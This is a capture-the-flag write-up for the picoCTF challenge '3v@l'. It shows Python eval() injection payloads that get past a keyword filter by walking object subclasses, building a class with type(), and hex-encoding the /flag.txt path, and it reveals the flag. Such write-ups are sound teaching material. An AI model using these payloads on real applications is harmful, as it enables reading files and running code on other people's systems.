## 3v@l

[Link to challenge](https://play.picoctf.org/practice/challenge/484)

Write-up:

1. The challenge is vulnerable to Python `eval()` injection. My first attempt was to run a system command:

    ```python
    __import__('os').system('ls')
    ```

    But this returned `Error: Detected forbidden keyword 'os'.`
    So, direct access to the `os` module is blocked.

1. To bypass keyword restrictions, I tried:

    ```python
    ().__class__.__base__.__subclasses__()
    ```

    This returns a long list of all subclasses of Python's base object, including many useful classes.

3. I filtered the subclasses for file and IO-related classes:

    ```python
    [c.__name__ for c in ().__class__.__base__.__subclasses__() if "File" in c.__name__ or "IO" in c.__name__]
    ```

    This revealed several interesting classes, such as `FileWrapper`, `ZipFile`, and `_IOBase`.

4. I tried to use one of these classes to read the flag:

    ```python
    [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__=="FileWrapper"][0]("/flag.txt").read()
    ```

    But this failed with: `Error: Detected forbidden keyword 'ls'.`
    It seems the challenge blocks certain keywords, possibly by scanning for substrings like "ls" (which appears in "cls").

5. Looking at the hints, we see: **You might need encoding or dynamic construction to bypass restrictions.** We can dynamiccaly create a class using `type`: <br>

    ```python
    type('dynamicClass', (object,), {
        'method': lambda self: open('/flag.txt').read()
        })().method()
    ```

    We get the following error message: **Error: Detected forbidden keyword ''.**

6. Following the hint, we attempt to use encoding:

    ```python
    type('dynamicClass', (object,), {
        'method': lambda self: open((bytes.fromhex('2f666c61672e747874').decode('utf-8'))).read()
    })().method()
    ```

    This gets us the flag: **picoCTF{D0nt_Use_Unsecure_f@nctionsf847a9bc}**